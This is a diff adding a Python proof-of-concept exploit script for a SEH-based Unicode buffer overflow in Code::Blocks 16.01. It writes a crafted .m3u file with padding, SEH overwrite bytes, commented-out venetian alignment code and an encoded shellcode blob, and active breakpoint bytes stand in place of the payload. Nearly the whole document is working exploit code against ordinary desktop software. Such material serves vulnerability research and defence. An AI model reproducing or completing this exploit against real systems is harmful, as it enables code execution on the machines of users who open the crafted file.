@@ -1,0 +1,31 @@
+# Exploit Title: Code Blocks 16.01 - Buffer Overflow (SEH) UNICODE
+# Date: 2020-04-17
+# Exploit Author: T3jv1l
+# Software Link: https://sourceforge.net/projects/codeblocks/files/Binaries/16.01/Windows/codeblocks-16.01-setup.exe
+# Software version: 16.01
+
+
+buffer="A"*536	#buffer
+buffer+="\x61\x41"	#POPAD + Aligned
+buffer+="\xF2\x41"	#POP/POP/RET
+
+#----------------------Align the eax to point to the shellcode PART -----------------------
+#buffer+="\x90"	#NOP
+#buffer+="\x6e"	#venetian padding
+#buffer+="\x05\x37\x13"	#add eax, 0x13003700
+#buffer+="\x6e"
+#buffer+="\x2d\x36\x13"	#sub eax, 0x13003600
+#buffer+="\x6e"	#venetian padding
+#buffer+="\x50"	#push eax
+#buffer+="\x6e"	#Venetian padding
+#buffer+="\xc3"	#ret
+
+#----------------------Shellcode PlaceHOLDER ----------------------------------------------
+#uffer+="\x90"*111
+#buffer+=("PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLIX52KPKPM01PDIJEP1Y0QT4KPPNPTK1BLLTK1BMDDKSBNHLO6WPJNFNQKOVLOLC13LM2NLO07QXOLMKQ7WJBZR220WDKQBN0TKOZOLTKPLN1T8ZCOXKQZ10QTKQIMPKQXSTKOYLXISOJ19TKNTTKM1XV01KOFL7Q8OLMKQGW08YPD5L6KSSMJXOKSMMTBU9TPXDKR8MTKQYCRF4KLLPKTKPXMLKQJ3TKKTDKKQZ0E9OTMTO4QK1K1Q291JPQKO9PQOQOQJTKN2JKDM1MRJKQ4M3UGBKPM0M0R0RHNQTKRO4GKOXUWKL0VU6BPVQXVFDU7MUMKO9EOLM63LLJE0KKYP2UM5WKOWN3T2RORJKP1CKOJ5BCS1RL33NNS5RX2EKPA")
+buffer+="\xcc\xcc\xcc\xcc"
+buffer+="\x90"*(5000-len(buffer))
+f=open('exploit.m3u','w');
+f.write(buffer);
+f.close();
+print "[+] File created."
